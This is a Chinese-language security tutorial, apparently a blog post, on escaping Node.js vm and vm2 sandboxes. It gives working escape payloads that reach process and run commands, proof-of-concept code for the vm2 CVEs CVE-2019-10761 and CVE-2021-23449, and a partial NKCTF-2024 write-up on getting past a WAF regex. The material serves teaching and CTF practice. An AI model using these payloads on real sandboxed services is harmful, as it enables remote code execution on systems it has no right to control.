<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="aa1ef54a6324eaa3cbee3110f47f0a3a">Nodejs 沙箱逃逸</h2>
<h3 data-content="1" id="73a9015353ae7490e45d4a5b257e20c8">沙箱简介</h3>
<p>​        计算机世界的沙箱，实际上是对线下一种生活现象的虚拟化模拟。在现实生活中，孩子们会用木板在沙地或沙滩上围出一个方盒子，然后在里面用沙子堆砌、创造出各种形状，如城堡、房屋、山丘等。这个方盒子就是一个沙箱，它具有两个核心特点：一是有明确的边界，游戏和创造活动都被限制在这个边界内；二是使用沙子作为游戏材料，创造出来的任何东西都可以轻易地被抹平，不留痕迹。</p>
<p>​        在计算机世界中，这种沙箱的概念被数字化模拟了出来。通过软硬件手段的结合，可以在一台设备（如服务器或手机）中模拟出一个“管控”区域。这个区域内部是预先指定和划分出来的运算与存储资源，与宿主设备的其他资源完全隔离。应用代码可以在这个模拟区域内运行，即使它是病毒、木马或DDoS攻击软件，也只能在这个资源受限的模拟世界中折腾，无法看到或影响宿主设备中的其他部分，更无法滥用宿主资源导致设备崩溃。此外，由于这个区域是模拟的，因此无论里面运行着什么，都可以一键删除，实现瞬间的清零。</p>
<p>​        简而言之，计算机世界的沙箱就是一种虚拟化技术，用于在安全的环境中运行和测试代码，防止恶意软件对宿主设备造成损害。</p>
<p>​         在Node.js中，沙箱是一种重要的安全机制，它通过隔离和限制程序对系统资源的访问，为运行不信任的代码提供了一个安全的环境。通过<code>vm</code>模块或第三方库，开发者可以创建和管理沙箱，确保系统的安全性和稳定性，但同时也需要关注潜在的安全风险。</p>
<h3 data-content="1" id="9b8f64a09ad5ab5d37e05554401a53ca">Nodejs的作用域</h3>
<p>​         在Node.js的编程环境中，每个JavaScript文件都被视为一个独立的模块，它们各自拥有自己的私有作用域（或称为上下文）。这意味着，一个模块内部定义的变量、函数等默认情况下是无法被其他模块直接访问的。这种设计保证了模块之间的独立性和封装性，避免了全局命名空间的污染。</p>
<h4 data-content="1" id="cdeb41025d46e44738444391adead5e1">全局作用域（Global Scope）</h4>
<p>​        在Node.js中，<code>global</code>对象是一个全局对象，它的属性和方法在所有模块中都是可访问的。这包括了如<code>console</code>、<code>process</code>、<code>Buffer</code>等内置对象，以及任何直接添加到<code>global</code>对象上的自定义属性或方法。但是，通常不推荐在全局作用域中添加大量自定义变量或函数，因为这可能会导致命名冲突和难以追踪的错误。</p>
<h4 data-content="1" id="5269c7e69e535a1df6f26b081b283f40">模块作用域（Module Scope）</h4>
<p>​        每个Node.js文件都被视为一个独立的模块。这些模块拥有它们自己的作用域，也就是说，一个模块中的变量、函数等默认不会影响到其他模块。这种设计使得模块之间天然隔离，减少了相互之间的干扰。</p>
<p>代码示例：</p>
<p>(一)</p>
<p>a.js</p>
<div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nx">name</span> <span class="o">=</span> <span class="s1">'P4tt0n'</span>
</pre></div>
<p>b.js</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'./a.js'</span><span class="p">)</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000321-e954f9c6-4cfa-1.png"/></p>
<p>（二）</p>
<p>a.js</p>
<div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nx">name</span> <span class="o">=</span> <span class="s1">'P4tt0n'</span>
<span class="nx">exports</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">name</span>
</pre></div>
<p>b.js</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'./a.js'</span><span class="p">)</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000457-229d71ae-4cfb-1.png"/></p>
<p>由此可见a.js和b.js不在同一个作用域，只有使用<code>require</code>将一个包中的模块引入到另一个包,才能实现功能的引用.而且这并不是把一个包中的所有变量和函数引入到另一个包,require只返回一个模块的导出对象，这取决于模块自身的 <code>module.exports</code> 或 <code>exports</code> 对象的设置</p>
<p>（三）</p>
<p>a.js</p>
<div class="highlight"><pre><span></span><span class="nx">global</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s1">'P4tt0n'</span>
</pre></div>
<p>b.js</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'./a.js'</span><span class="p">)</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000500-248ce2ba-4cfb-1.png"/></p>
<p>​         可见，我们输出<code>name</code>时，不需要使用file.name的形式，我们可以直接使用<code>name</code>进行输出，同时<code>name</code>也不需要使用<code>exports</code>进行导出，因为此时name已经挂载在global上了，它的作用域不在a.js中了。</p>
<h3 data-content="1" id="5fd56230fc694e9753ffda7a4f0e789e">VM沙箱</h3>
<p>​        上文介绍了作用域，vm模块就是通过定义一个全新的作用域，让代码在这个新的作用域中运行，这样就与其他作用域隔离了。</p>
<p>接下来介绍一些vm模块的api</p>
<ol>
<li>
<p>vm.Script</p>
<p><code>new vm.Script(code[, options])</code>: 创建一个预编译的Script对象，表示一段JavaScript代码。</p>
<p><code>script.runInContext([contextifiedSandbox[, options]])</code>: 在指定的上下文中执行预编译的脚本。<code>script.runInNewContext([sandbox[, options]])</code>: 创建一个新的上下文并在其中执行脚本。</p>
<p>vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</p>
</li>
<li>
<p>vm.createContext([sandbox[, options]])</p>
<p>创建一个新的、独立的上下文（沙箱），可以包含预先定义的变量和函数。</p>
<p>使用前需要创建一个沙箱对象，再将沙箱对象传递给该方法（如果没有就会生成一个空的沙箱对象），v8为这个沙箱对象在当前的global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性</p>
<p>具体结构：</p>
<div class="highlight"><pre><span></span><span class="nx">V8</span><span class="p">{</span>
  <span class="nx">sandbox</span><span class="p">{}</span>
  <span class="nx">global</span><span class="p">{}</span>
  <span class="p">}</span>
</pre></div>
<p>示例：</p>
<p>c.js</p>
<div class="highlight"><pre><span></span><span class="c1">// Node.js program to demonstrate the      </span>
 <span class="c1">// vm.createContext([contextObject[, options]]) </span>
 <span class="c1">// method </span>

 <span class="c1">// Including util and vm module </span>
 <span class="kr">const</span> <span class="nx">util</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'util'</span><span class="p">);</span> 
 <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'vm'</span><span class="p">);</span> 

 <span class="c1">// Assigning value to the global variable </span>
 <span class="nx">global</span><span class="p">.</span><span class="nx">globalVar</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> 

 <span class="c1">// Defining Context object </span>
 <span class="kr">const</span> <span class="nx">object</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">globalVar</span><span class="o">:</span><span class="mi">4</span> <span class="p">};</span> 

 <span class="c1">// Contextifying stated object </span>
 <span class="c1">// using createContext method </span>
 <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span> 

 <span class="c1">// Compiling code </span>
 <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="s1">'globalVar /= 2;'</span><span class="p">,</span> <span class="nx">object</span><span class="p">);</span> 

 <span class="c1">// Displays the context </span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"Context:"</span><span class="p">,</span> <span class="nx">object</span><span class="p">);</span> 

 <span class="c1">// Dsiplays value of global variable </span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"Global Variable is "</span><span class="p">,</span> <span class="nx">global</span><span class="p">.</span><span class="nx">globalVar</span><span class="p">);</span>
</pre></div>
</li>
</ol>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000526-344b372e-4cfb-1.png"/></p>
<ol>
<li>
<p>vm.runInContext(code, contextifiedSandbox[, options])</p>
<p>参数为要执行的代码和创建完作用域的上下文(沙箱对象)，代码会在传入和沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同</p>
<p>示例d.js</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'vm'</span><span class="p">)</span>
 <span class="nx">global</span><span class="p">.</span><span class="nx">global_var</span> <span class="o">=</span> <span class="mi">1</span>
 <span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="p">{</span><span class="nx">global_var</span><span class="o">:</span> <span class="mi">2</span><span class="p">}</span> <span class="c1">//创建一个沙箱对象</span>
 <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">)</span>  <span class="c1">//创建一个上下文对象</span>
 <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="s1">'global_var*=2'</span><span class="p">,</span><span class="nx">sandbox</span><span class="p">)</span>

 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">)</span>    <span class="c1">// { global_var: 4 }</span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">global_var</span><span class="p">)</span> <span class="c1">// 1</span>
</pre></div>
</li>
</ol>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000540-3c89748c-4cfb-1.png"/></p>
<ol>
<li>
<p>vm.runInNewContext(code[, sandbox[, options]])</p>
<p>创建一个新的上下文并在其中运行JavaScript代码。这个函数是<code>createContext()</code>和<code>runInContext()</code>的结合版，传入要执行的代码和沙箱对象</p>
</li>
<li>
<p>vm.runInThisContext(code[, options])</p>
<p>在当前上下文中运行JavaScript代码，代码可以直接访问当前作用域的变量。<code>sandbox</code>沙箱中可以访问到global中的属性，但是无法访问其他包的属性。（无法访问本地的属性)</p>
<p>示例e.js</p>
<div class="highlight"><pre><span></span><span class="c1">// Node.js program to demonstrate the      </span>
 <span class="c1">// runInThisContext() method </span>

 <span class="c1">// Including vm module </span>
 <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'vm'</span><span class="p">);</span> 

 <span class="c1">// Declaring local variable </span>
 <span class="kd">let</span> <span class="nx">localVar</span> <span class="o">=</span> <span class="s1">'GYH'</span><span class="p">;</span> 

 <span class="c1">// Calling runInThisContext method </span>
 <span class="kr">const</span> <span class="nx">vmresult</span> <span class="o">=</span> 
  <span class="nx">vm</span><span class="p">.</span><span class="nx">runInThisContext</span><span class="p">(</span><span class="s1">'localVar = "P4tt0n";'</span><span class="p">);</span> 

 <span class="c1">// Prints output for vmresult </span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`vmresult:'</span><span class="si">${</span><span class="nx">vmresult</span><span class="si">}</span><span class="sb">',  </span>
<span class="sb">               localVar:'</span><span class="si">${</span><span class="nx">localVar</span><span class="si">}</span><span class="sb">'`</span><span class="p">);</span> 

 <span class="c1">// Constructing eval </span>
 <span class="kr">const</span> <span class="nx">evalresult</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="s1">'localVar = "LZ";'</span><span class="p">);</span> 

 <span class="c1">// Prints output for evalresult </span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`evalresult:'</span><span class="si">${</span><span class="nx">evalresult</span><span class="si">}</span><span class="sb">',  </span>
<span class="sb">                 localVar:'</span><span class="si">${</span><span class="nx">localVar</span><span class="si">}</span><span class="sb">'`</span><span class="p">);</span>
</pre></div>
</li>
</ol>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000553-4419d386-4cfb-1.png"/></p>
<ol>
<li>
<p>vm.createScript(code[, options])</p>
<p>（过时，从Node.js v0.12开始不再推荐使用）创建一个可执行的Script对象。</p>
<p>### VM沙箱逃逸</p>
</li>
</ol>
<p>举一个例子</p>
<p>f.js</p>
<div class="highlight"><pre><span></span><span class="s2">"use strict"</span><span class="p">;</span>
<span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"vm"</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="sb">`this.constructor.constructor('return global')()`</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">process</span><span class="p">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000603-4a40fa32-4cfb-1.png"/></p>
<p>​        很明显是逃逸出去了。如何做到的？debug跟进一下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000612-4f2caa46-4cfb-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000623-55bbba00-4cfb-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000634-5ca74280-4cfb-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000646-636cc194-4cfb-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000653-6823f720-4cfb-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000702-6d2b4c46-4cfb-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000710-724dfef8-4cfb-1.png"/></p>
<p>​         这里的this是指向传递到runInNewContext函数的一个对象，他是不属于沙箱内部环境的，访问当前对象的构造器的构造器，也就是Function的构造器，由于继承关系，它的作用域是全局变量，执行代码，获取外部global。拿到process对象就可以执行命令了。</p>
<p>constructor的理解</p>
<p>示例：</p>
<div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">PP</span><span class="p">(){</span>
    <span class="nx">name</span> <span class="o">:</span> <span class="s1">'P4tt0n'</span>
<span class="p">};</span>

<span class="kr">const</span> <span class="nx">a</span><span class="o">=</span> <span class="k">new</span> <span class="nx">PP</span><span class="p">();</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">constructor</span><span class="p">);</span><span class="c1">//PP</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">);</span><span class="c1">//Function</span>
</pre></div>
<h4 data-content="1" id="130673c41c919c5048ef0f4cdc1fff11">绕过Object.create(null)</h4>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'vm'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="sb">`...`</span><span class="p">;</span>
<span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'Hello '</span> <span class="o">+</span> <span class="nx">res</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000723-7a05e624-4cfb-1.png"/></p>
<p>​         我们现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'vm'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span>
<span class="sb">`(() =&gt; {</span>
<span class="sb">    const a = {}</span>
<span class="sb">    a.toString = function () {</span>
<span class="sb">      const cc = arguments.callee.caller;</span>
<span class="sb">      const p = (cc.constructor.constructor('return process'))();</span>
<span class="sb">      return p.mainModule.require('child_process').execSync('whoami').toString()</span>
<span class="sb">    }</span>
<span class="sb">    return a</span>
<span class="sb">  })()`</span><span class="p">;</span>

<span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'Hello '</span> <span class="o">+</span> <span class="nx">res</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729000735-80b03fe2-4cfb-1.png"/></p>
<p>​         我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，通过arguments.callee.caller获得到沙箱外的一个对象，利用这个对象的构造函数的构造函数返回了process，再调用process进行rce，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数。</p>
<h3 data-content="1" id="392ad96a077de1c11b89f86321ba22e2">VM2沙箱逃逸</h3>
<p>​        vm2相较于vm多了很多限制。其中之一就是引入了es6新增的proxy特性。增加一些规则来限制constructor函数以及<strong>_proto</strong>这些属性的访问。proxy可以认为是代理拦截，编写一种机制对外部访问进行过滤或者改写。</p>
<h4 data-content="1" id="177c84cefb3005b7be9d9795ee0d5135">CVE-2019-10761</h4>
<p>该漏洞要求vm2版本&lt;=3.6.10</p>
<p>poc</p>
<pre><code>"use strict";
const {VM} = require('vm2');
const untrusted = `
const f = Buffer.prototype.write;
const ft = {
        length: 10,
        utf8Write(){

        }
}
function r(i){
    var x = 0;
    try{
        x = r(i);
    }catch(e){}
    if(typeof(x)!=='number')
        return x;
    if(x!==i)
        return x+1;
    try{
        f.call(ft);
    }catch(e){
        return e;
    }
    return null;
}
var i=1;
while(1){
    try{
        i=r(i).constructor.constructor("return process")();
        break;
    }catch(x){
        i++;
    }
}
i.mainModule.require("child_process").execSync("whoami").toString()
`;
try{
    console.log(new VM().run(untrusted));
}catch(x){
    console.log(x);
}</code></pre>
<h4 data-content="1" id="34e33967155e9beb86369778e6d8c2e7">CVE-2021-23449</h4>
<p>​        import()在JavaScript中是一个语法结构，不是函数，没法通过之前对 require这种函数处理相同的方法来处理它，导致实际上我们调用 import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获 取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正 则匹配并替换了\bimport\b关键字，在编译失败的时候，报Dynamic Import not supported错误</p>
<p>poc</p>
<pre><code>let res = import('./foo.js')
res.toString.constructor("return this")().process.mainModule.require("child_process").execSync("whoami").toString();</code></pre>
<p>另外的poc</p>
<pre><code>Symbol = {
  get toStringTag(){
    throw f=&gt;f.constructor("return process")()
  }
};
try{
  Buffer.from(new Map());
}catch(f){
  Symbol = {};
  f(()=&gt;{}).mainModule.require("child_process").execSync("whoami").toString();
}</code></pre>
<h3 data-content="1" id="ba46244f5ed6f77b308162425601e035">例题</h3>
<h4 data-content="1" id="bb19b93d93f4a425a3e7430ac3b53097"><strong>NKCTF-2024 全世界最简单的ctf</strong></h4>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'body-parser'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"fs"</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'path'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"vm"</span><span class="p">);</span>

<span class="nx">app</span>
<span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
<span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">'views'</span><span class="p">,</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">'views'</span><span class="p">))</span>
<span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">'/public'</span><span class="p">)))</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">){</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">__dirname</span> <span class="o">+</span> <span class="s1">'/public/home.html'</span><span class="p">);</span>
<span class="p">})</span>


<span class="kd">function</span> <span class="nx">waf</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">pattern</span> <span class="o">=</span> <span class="sr">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">pattern</span><span class="p">)){</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">"what can I say? hacker out!!"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">){</span>
        <span class="kd">let</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">code</span><span class="p">;</span>
        <span class="kd">let</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
        <span class="kd">let</span> <span class="nx">context</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nx">waf</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span>
            <span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">){</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
            <span class="nx">require</span><span class="p">(</span><span class="s1">'./hack'</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/secret'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">__filename</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">content</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">__filename</span><span class="p">,</span> <span class="s2">"utf-8"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">content</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">__filename</span><span class="p">,</span> <span class="s2">"utf-8"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">})</span>


<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="p">()=&gt;{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"listen on 3000"</span><span class="p">);</span>
<span class="p">})</span>
</pre></div>
<p>很明显的vm沙箱逃逸问题</p>
<p>正常的payload</p>
<div class="highlight"><pre><span></span><span class="k">throw</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
     <span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">(){</span>
         <span class="kr">const</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
         <span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">'return process'</span><span class="p">))();</span>
         <span class="k">return</span> <span class="nx">p</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">})</span>
</pre></div>
<p>接下来思考如何绕waf</p>
<p>因为题目没有/i，所以对大小写不敏感</p>
<p>我们的process可以等价于</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">pro</span><span class="o">=</span><span class="s1">'Process'</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">();</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">pro</span><span class="p">)</span><span class="c1">//打印process</span>
</pre></div>
<p>或者String.fromCharCode绕过</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">pro</span><span class="o">=</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">115</span><span class="p">)</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">pro</span><span class="p">)</span><span class="c1">//输出process</span>
</pre></div>
<p>还需要绕过exec</p>
<p>我们通过反射来绕过，就是根据你提供的对象的键获取到对应的值</p>
